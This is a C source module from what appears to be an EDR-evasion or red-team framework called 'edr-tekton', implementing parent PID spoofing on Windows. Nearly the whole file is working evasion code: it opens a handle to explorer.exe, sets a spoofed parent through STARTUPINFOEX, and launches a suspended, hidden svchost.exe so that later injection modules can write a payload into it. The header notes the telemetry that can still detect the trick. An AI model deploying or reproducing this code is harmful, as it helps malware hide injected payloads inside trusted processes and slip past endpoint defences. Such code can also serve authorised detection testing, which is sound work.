/*
 * edr-tekton :: Parent PID Spoofing Module
 * Cat 9: Create child process with spoofed parent PID
 *
 * Windows process creation records the parent PID in the EPROCESS
 * structure. EDR products use the parent-child relationship to
 * detect suspicious process trees (e.g., cmd.exe spawned from
 * a macro-enabled Word document).
 *
 * PPID spoofing uses PROC_THREAD_ATTRIBUTE_PARENT_PROCESS in the
 * extended startup info (STARTUPINFOEX) to set an arbitrary parent
 * process when calling CreateProcessA. The child inherits the
 * spoofed parent's security context and token.
 *
 * Common spoofing targets:
 *   - explorer.exe:  most processes have this as parent
 *   - svchost.exe:   service host processes
 *   - RuntimeBroker: UWP app parent
 *   - sihost.exe:    shell infrastructure host
 *
 * Detection surface:
 *   - PsSetCreateProcessNotifyRoutineEx: kernel callback sees the
 *     real creator PID, not the spoofed parent. Advanced EDRs
 *     compare creator vs parent.
 *   - ETW ProcessStart events also record real creator PID.
 *   - Handle to parent process (required) may trigger ObRegisterCallbacks.
 *
 * This module creates a suspended child process with the spoofed
 * parent, then returns the handle for downstream injection modules
 * to use.
 *
 * Pipeline stage: TEKTON_STAGE_EVASION_PRE
 */

#include "tekton/modules/evasion.h"
#include "tekton/core/log.h"
#include <string.h>
#include <stdlib.h>

/* ── Internal state ─────────────────────────────────────── */

typedef struct _PPID_STATE {
    TEKTON_PPID_CFG cfg;
    HANDLE          child_process;
    HANDLE          child_thread;
    DWORD           child_pid;
    HANDLE          parent_handle;  /* Handle to spoofed parent */
} PPID_STATE;

/* ── Module vtable implementation ───────────────────────── */

static TEKTON_STATUS ppid_init(PTEKTON_MODULE self, PTEKTON_CONTEXT ctx) {
    (void)ctx;

    PPID_STATE* state = (PPID_STATE*)malloc(sizeof(PPID_STATE));
    if (!state) return TEKTON_ERR_ALLOC;

    memset(state, 0, sizeof(*state));

    strncpy(state->cfg.parent_process, "explorer.exe",
        sizeof(state->cfg.parent_process) - 1);
    state->cfg.parent_pid = 0;  /* Auto-find by name */

    self->private_data = state;

    TLOG_DEBUG("evasion_ppid: init (parent='%s', pid=%lu)",
        state->cfg.parent_process,
        (unsigned long)state->cfg.parent_pid);
    return TEKTON_OK;
}

static TEKTON_STATUS ppid_execute(PTEKTON_MODULE self, PTEKTON_CONTEXT ctx) {
    PPID_STATE* state = (PPID_STATE*)self->private_data;
    if (!state) return TEKTON_ERR_INVALID_STATE;

    if (ctx->dry_run) {
        TLOG_INFO("evasion_ppid: [DRY RUN] would spoof PPID to '%s' (pid=%lu)",
            state->cfg.parent_process,
            (unsigned long)state->cfg.parent_pid);
        return TEKTON_OK;
    }

#ifdef _WIN32
    /* ── Step 1: Find parent PID ──────────────────── */
    DWORD parent_pid = state->cfg.parent_pid;

    if (parent_pid == 0) {
        /* Find by process name using the shared injection utility */
        parent_pid = TektonInjectFindProcess(ctx, state->cfg.parent_process);
        if (parent_pid == 0) {
            TLOG_ERROR("evasion_ppid: parent process '%s' not found",
                state->cfg.parent_process);
            return TEKTON_ERR_NOT_FOUND;
        }
    }

    TLOG_DEBUG("evasion_ppid: target parent PID = %lu", (unsigned long)parent_pid);

    /* ── Step 2: Open handle to parent process ────── */
    HANDLE hParent = OpenProcess(PROCESS_ALL_ACCESS, FALSE, parent_pid);
    if (!hParent) {
        /* Fallback: try with just CREATE_PROCESS access */
        hParent = OpenProcess(PROCESS_CREATE_THREAD | 0x0080 /* PROCESS_CREATE_PROCESS */,
            FALSE, parent_pid);
    }

    if (!hParent) {
        TLOG_ERROR("evasion_ppid: OpenProcess(%lu) failed", (unsigned long)parent_pid);
        return TEKTON_ERR_INJECT_FAIL;
    }
    state->parent_handle = hParent;

    /* ── Step 3: Initialize STARTUPINFOEX ─────────── */
    /*
     * STARTUPINFOEX extends STARTUPINFO with a proc thread attribute
     * list. PROC_THREAD_ATTRIBUTE_PARENT_PROCESS (0x00020000) sets
     * the parent process for the new child.
     */

    typedef struct _STARTUPINFOA_MINI {
        DWORD  cb;
        LPSTR  lpReserved;
        LPSTR  lpDesktop;
        LPSTR  lpTitle;
        DWORD  dwX, dwY, dwXSize, dwYSize;
        DWORD  dwXCountChars, dwYCountChars;
        DWORD  dwFillAttribute;
        DWORD  dwFlags;
        WORD   wShowWindow;
        WORD   cbReserved2;
        PVOID  lpReserved2;
        HANDLE hStdInput, hStdOutput, hStdError;
    } STARTUPINFOA_MINI;

    typedef struct _STARTUPINFOEX_MINI {
        STARTUPINFOA_MINI  StartupInfo;
        PVOID              lpAttributeList;
    } STARTUPINFOEX_MINI;

    typedef struct _PROCESS_INFORMATION {
        HANDLE hProcess;
        HANDLE hThread;
        DWORD  dwProcessId;
        DWORD  dwThreadId;
    } PROCESS_INFORMATION;

    typedef BOOL (WINAPI *pfnInitializeProcThreadAttributeList)(
        PVOID, DWORD, DWORD, SIZE_T*);
    typedef BOOL (WINAPI *pfnUpdateProcThreadAttribute)(
        PVOID, DWORD, ULONG_PTR, PVOID, SIZE_T, PVOID, SIZE_T*);
    typedef VOID (WINAPI *pfnDeleteProcThreadAttributeList)(PVOID);
    typedef BOOL (WINAPI *pfnCreateProcessA)(
        LPCSTR, LPSTR, PVOID, PVOID, BOOL, DWORD, PVOID, LPCSTR,
        PVOID, PVOID);

    HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");

    pfnInitializeProcThreadAttributeList pInitAttr =
        (pfnInitializeProcThreadAttributeList)
        GetProcAddress(hKernel32, "InitializeProcThreadAttributeList");
    pfnUpdateProcThreadAttribute pUpdateAttr =
        (pfnUpdateProcThreadAttribute)
        GetProcAddress(hKernel32, "UpdateProcThreadAttribute");
    pfnDeleteProcThreadAttributeList pDeleteAttr =
        (pfnDeleteProcThreadAttributeList)
        GetProcAddress(hKernel32, "DeleteProcThreadAttributeList");
    pfnCreateProcessA pCreateProc = (pfnCreateProcessA)
        GetProcAddress(hKernel32, "CreateProcessA");

    if (!pInitAttr || !pUpdateAttr || !pDeleteAttr || !pCreateProc) {
        TLOG_ERROR("evasion_ppid: failed to resolve attribute list APIs");
        CloseHandle(hParent);
        return TEKTON_ERR_NOT_FOUND;
    }

    /* Query required buffer size */
    SIZE_T attr_size = 0;
    pInitAttr(NULL, 1, 0, &attr_size);

    PVOID attr_list = malloc(attr_size);
    if (!attr_list) {
        CloseHandle(hParent);
        return TEKTON_ERR_ALLOC;
    }

    if (!pInitAttr(attr_list, 1, 0, &attr_size)) {
        TLOG_ERROR("evasion_ppid: InitializeProcThreadAttributeList failed");
        free(attr_list);
        CloseHandle(hParent);
        return TEKTON_ERR_INJECT_FAIL;
    }

    /* Set parent process attribute */
    #define PROC_THREAD_ATTRIBUTE_PARENT_PROCESS 0x00020000

    if (!pUpdateAttr(attr_list, 0,
            PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,
            &hParent, sizeof(HANDLE), NULL, NULL)) {
        TLOG_ERROR("evasion_ppid: UpdateProcThreadAttribute (PPID) failed");
        pDeleteAttr(attr_list);
        free(attr_list);
        CloseHandle(hParent);
        return TEKTON_ERR_INJECT_FAIL;
    }

    #undef PROC_THREAD_ATTRIBUTE_PARENT_PROCESS

    /* ── Step 4: Create child process (suspended) ─── */
    STARTUPINFOEX_MINI si;
    PROCESS_INFORMATION pi;
    memset(&si, 0, sizeof(si));
    memset(&pi, 0, sizeof(pi));

    si.StartupInfo.cb = sizeof(si);
    si.lpAttributeList = attr_list;

    /*
     * EXTENDED_STARTUPINFO_PRESENT = 0x00080000
     * CREATE_SUSPENDED             = 0x00000004
     * CREATE_NO_WINDOW             = 0x08000000
     *
     * Child is created suspended so injection modules can write
     * payload before resuming.
     */
    #define EXTENDED_STARTUPINFO_PRESENT 0x00080000

    /* Default child: svchost.exe (blends with system processes) */
    char child_cmd[] = "C:\\Windows\\System32\\svchost.exe";

    BOOL created = pCreateProc(
        NULL,                   /* lpApplicationName */
        child_cmd,              /* lpCommandLine     */
        NULL,                   /* lpProcessAttributes */
        NULL,                   /* lpThreadAttributes  */
        FALSE,                  /* bInheritHandles     */
        CREATE_SUSPENDED | CREATE_NO_WINDOW | EXTENDED_STARTUPINFO_PRESENT,
        NULL,                   /* lpEnvironment     */
        NULL,                   /* lpCurrentDirectory */
        (PVOID)&si,             /* lpStartupInfo     */
        (PVOID)&pi              /* lpProcessInformation */
    );

    #undef EXTENDED_STARTUPINFO_PRESENT

    pDeleteAttr(attr_list);
    free(attr_list);

    if (!created) {
        TLOG_ERROR("evasion_ppid: CreateProcessA with spoofed PPID failed");
        CloseHandle(hParent);
        return TEKTON_ERR_INJECT_FAIL;
    }

    state->child_process = pi.hProcess;
    state->child_thread = pi.hThread;
    state->child_pid = pi.dwProcessId;

    /* Store in context for downstream injection modules */
    ctx->target_handle = pi.hProcess;
    ctx->target_pid = pi.dwProcessId;

    TLOG_INFO("evasion_ppid: spawned PID %lu with spoofed parent PID %lu (%s)",
        (unsigned long)pi.dwProcessId,
        (unsigned long)parent_pid,
        state->cfg.parent_process);

    return TEKTON_OK;

#else
    /* Linux dev stub */
    TLOG_INFO("evasion_ppid: [STUB] would spoof PPID to '%s'",
        state->cfg.parent_process);
    ctx->target_pid = 5678;
    return TEKTON_OK;
#endif
}

static VOID ppid_cleanup(PTEKTON_MODULE self) {
    PPID_STATE* state = (PPID_STATE*)self->private_data;
    if (state) {
#ifdef _WIN32
        if (state->child_thread) CloseHandle(state->child_thread);
        if (state->child_process) CloseHandle(state->child_process);
        if (state->parent_handle) CloseHandle(state->parent_handle);
#endif
        TEKTON_SECURE_ZERO(state, sizeof(PPID_STATE));
        free(state);
        self->private_data = NULL;
    }
}

static DWORD ppid_risk_score(PTEKTON_MODULE self) {
    (void)self;
    /*
     * Moderate risk: CreateProcess with STARTUPINFOEX is a
     * legitimate API pattern used by Windows Terminal, Task
     * Manager, etc. However, EDRs with kernel callbacks can
     * compare creator PID vs declared parent PID and flag
     * mismatches. The OpenProcess on the spoofed parent may
     * also trigger ObRegisterCallbacks if the EDR monitors
     * handle operations.
     */
    return 20;
}

static BOOL ppid_check_compat(PTEKTON_MODULE self, PTEKTON_CONTEXT ctx) {
    (void)self;
    (void)ctx;
    /* PROC_THREAD_ATTRIBUTE_PARENT_PROCESS available since Vista */
    return TRUE;
}

/* ── Module definition ─────────────────────────────────── */

TEKTON_MODULE tekton_mod_ppid_spoof = {
    .name           = "ppid_spoof",
    .description    = "Parent PID spoofing via STARTUPINFOEX (Cat 9)",
    .category       = TEKTON_CAT_EVASION,
    .target_surface = TEKTON_SURFACE_KERNEL_CB,
    .flags          = TEKTON_MOD_DESTRUCTIVE,
    .skill_ref      = "9",
    .init           = ppid_init,
    .execute        = ppid_execute,
    .cleanup        = ppid_cleanup,
    .get_risk_score = ppid_risk_score,
    .check_compat   = ppid_check_compat,
    .private_data   = NULL,
    .next           = NULL,
};

TEKTON_DECLARE_MODULE(tekton_mod_ppid_spoof);
